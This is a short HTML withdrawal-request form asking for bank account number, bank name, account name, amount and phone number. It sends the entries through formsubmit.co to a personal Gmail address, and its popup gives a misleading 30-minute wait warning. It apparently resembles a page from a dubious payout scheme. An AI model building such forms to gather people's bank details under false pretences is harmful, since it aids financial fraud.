<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Withdrawal Request Form</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .form-container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .form-container h2 {
            margin-bottom: 20px;
            text-align: center;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
        }
        .form-group input,
        .form-group select {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        .form-group button {
            width: 100%;
            padding: 10px;
            background-color: #28a745;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .form-group button:hover {
            background-color: #218838;
        }
    </style>
    <script>
        function showPopup() {
            alert("This will take up to 30 minutes or more for your request to be submitted successfully. Please wait and do not close your browser.");
        }
    </script>
</head>
<body>
    <div class="form-container">
        <h2>Withdrawal Request Form</h2>
        <form action="https://formsubmit.co/empirevirtual99@gmail.com" onsubmit="showPopup()">
            <div class="form-group">
                <label for="accountNumber">Account Number</label>
                <input type="text" id="accountNumber" name="accountNumber" required>
            </div>
            <div class="form-group">
                <label for="bankName">Bank Name</label>
                <select id="bankName" name="bankName" required>
                    <option value="">Select Bank</option>
                    <option value="access_bank">Access Bank</option>
                    <option value="citibank">Citibank</option>
                    <option value="diamond_bank">Diamond Bank</option>
                    <option value="ecobank">Ecobank</option>
                    <option value="fidelity_bank">Fidelity Bank</option>
                    <option value="first_bank">First Bank</option>
                    <option value="fcmb">First City Monument Bank (FCMB)</option>
                    <option value="gtb">Guaranty Trust Bank (GTB)</option>
                    <option value="heritage_bank">Heritage Bank</option>
                    <option value="keystone_bank">Keystone Bank</option>
                    <option value="polaris_bank">Polaris Bank</option>
                    <option value="providus_bank">Providus Bank</option>
                    <option value="stanbic_ibtc">Stanbic IBTC Bank</option>
                    <option value="standard_chartered">Standard Chartered Bank</option>
                    <option value="sterling_bank">Sterling Bank</option>
                    <option value="suntrust_bank">Suntrust Bank</option>
                    <option value="union_bank">Union Bank</option>
                    <option value="uba">United Bank for Africa (UBA)</option>
                    <option value="unity_bank">Unity Bank</option>
                    <option value="wema_bank">Wema Bank</option>
                    <option value="zenith_bank">Zenith Bank</option>
                    <option value="opay">OPAY</option>
                    <option value="palmpay">Palmpay</option>
                </select>
            </div>
            <div class="form-group">
                <label for="accountName">Account Name</label>
                <input type="text" id="accountName" name="accountName" required>
            </div>
            <div class="form-group">
                <label for="amount">Amount</label>
                <input type="number" id="amount" name="amount" required>
            </div>
            <div class="form-group">
                <label for="beneficiaryPhone">Beneficiary's Phone Number</label>
                <input type="tel" id="beneficiaryPhone" name="beneficiaryPhone" required>
            </div>
            <div class="form-group">
                <button type="submit">Submit Request</button>
            </div>
        </form>
        <p style="margin-top: 20px; font-size: 14px; color: #555;">
            <strong>Declaration:</strong> I, Sambo7785, hereby declare that the information provided above is accurate and true to the best of my knowledge. Providing incorrect or false informati[...]
        </p>
    </div>
</body>
</html>
